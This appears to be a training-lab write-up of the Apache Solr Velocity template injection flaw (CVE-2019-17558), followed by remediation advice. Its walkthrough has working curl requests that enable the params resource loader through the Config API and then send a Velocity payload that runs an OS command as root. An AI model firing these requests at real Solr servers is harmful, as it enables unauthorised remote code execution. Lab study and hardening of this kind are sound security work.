# Apache Solr Velocity Template Injection RCE (CVE-2019-17558)

## Overview

CVE-2019-17558 is a high-severity Remote Code Execution (RCE) vulnerability in Apache Solr versions 5.0.0 through 8.3.1. Apache Solr is an enterprise search platform built on Apache Lucene.

The vulnerability resides in the `VelocityResponseWriter` component. Solr provides a Config API (`/solr/<core>/config`) that allows dynamic modification of core configurations without restarting the service. An attacker can enable the `params.resource.loader.enabled` property via the Config API. Once enabled, Solr allows custom Apache Velocity template expressions to be supplied directly via HTTP request parameters (`v.template` and `v.template.custom`). Because Apache Velocity templates can invoke Java reflection methods on built-in tool objects (such as `java.lang.Runtime`), an unauthenticated attacker can execute arbitrary operating system commands on the Solr server.

- **Primary Interface**: `http://localhost:8130`
- **Docker Shortcut**: `./lab start solr-velocity`
- **Container Name**: `cyberlab_02_solr_velocity_ssti`
- **Port Mapping**: `8130:8983`
- **Image**: `vulhub/solr:8.2.0`
- **Default Core**: `demo`
- **RAM Footprint**: ~400 MB

---

## Exploitation Walkthrough

Exploitation follows a mandatory two-step verification flow.

### Step 0: Identify Available Solr Cores

Query the CoreAdmin API to discover active core names:

```bash
# Query the CoreAdmin API (in this environment, 'demo' is the active core)
curl -s "http://localhost:8130/solr/admin/cores?indexInfo=false&wt=json"
```

To extract the core name automatically in bash:

```bash
CORE=$(curl -s "http://localhost:8130/solr/admin/cores?indexInfo=false&wt=json" | grep -o '"name":"[^"]*"' | head -n1 | cut -d'"' -f4)
echo "Discovered Core: $CORE"
```

---

### Step 1: Enable `params.resource.loader.enabled` via Config API

By default, custom Velocity template parameters are disabled. Enable `params.resource.loader.enabled` by submitting a `POST` request to the target core's `/config` endpoint:

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  http://localhost:8130/solr/demo/config \
  -d '{
    "update-queryresponsewriter": {
      "startup": "lazy",
      "name": "velocity",
      "class": "solr.VelocityResponseWriter",
      "template.base.dir": "",
      "solr.resource.loader.enabled": "true",
      "params.resource.loader.enabled": "true"
    }
  }'
```

A successful response returns:

```json
{
  "responseHeader": {
    "status": 0,
    "QTime": 205
  },
  "WARNING": "This response format is experimental.  It is likely to change in the future."
}
```

---

### Step 2: Submit Custom Velocity Template Payload

Send an HTTP GET request to `/solr/demo/select` with `wt=velocity`, `v.template=custom`, and the custom template expression in `v.template.custom`.

> [!NOTE]
> When executing with `curl`, use `-g` (`--globoff`) and single quotes to prevent curl range globbing on `[1..$out.available()]` and bash shell variable expansion of `$rt`, `$ex`, etc.

```bash
curl -s -g 'http://localhost:8130/solr/demo/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
```

Alternatively, when targeting dynamically discovered core `${CORE}` with double quotes:

```bash
curl -s -g "http://localhost:8130/solr/${CORE}/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set(\$x=%27%27)+%23set(\$rt=\$x.class.forName(%27java.lang.Runtime%27))+%23set(\$chr=\$x.class.forName(%27java.lang.Character%27))+%23set(\$str=\$x.class.forName(%27java.lang.String%27))+%23set(\$ex=\$rt.getRuntime().exec(%27id%27))+\$ex.waitFor()+%23set(\$out=\$ex.getInputStream())+%23foreach(\$i+in+[1..\$out.available()])\$str.valueOf(\$chr.toChars(\$out.read()))%23end"
```

The command execution output is rendered directly in the response:

```text
     0  uid=0(root) gid=0(root) groups=0(root)
```

---

## Defensive Remediation & Hardening

1. **Upgrade Apache Solr**:
   Upgrade to Apache Solr 8.4.0 or newer. Solr 8.4 removed the params resource loader entirely and only enables configset-provided template rendering when the configset is uploaded by an authenticated user (`trusted`).
2. **Disable `VelocityResponseWriter`**:
   Remove or comment out `VelocityResponseWriter` declarations in `solrconfig.xml` if Velocity-rendered search responses are not required.
3. **Restrict Network and API Access**:
   Ensure Solr is never exposed to untrusted networks. Configure firewall rules or API gateway authentication to restrict access to Config APIs (`/solr/*/config`).

---

## Citations & Technical References

- **Official Vulhub Repository**: [Vulhub Solr CVE-2019-17558](https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-17558)
- **Apache Solr Security Advisory**: [Apache Solr Security Advisory - CVE-2019-17558](https://solr.apache.org/security.html#cve-2019-17558-apache-solr-rce-through-velocityresponsewriter)
- **Apache Solr JIRA Issue**: [SOLR-13971](https://issues.apache.org/jira/browse/SOLR-13971)
- **NVD Vulnerability Database**: [NVD CVE-2019-17558](https://nvd.nist.gov/vuln/detail/CVE-2019-17558)
- **Video Walkthrough**: [Michael Stepankin - Apache Solr Injection - DEF CON 27](https://www.youtube.com/watch?v=xf2E64o4hWc)
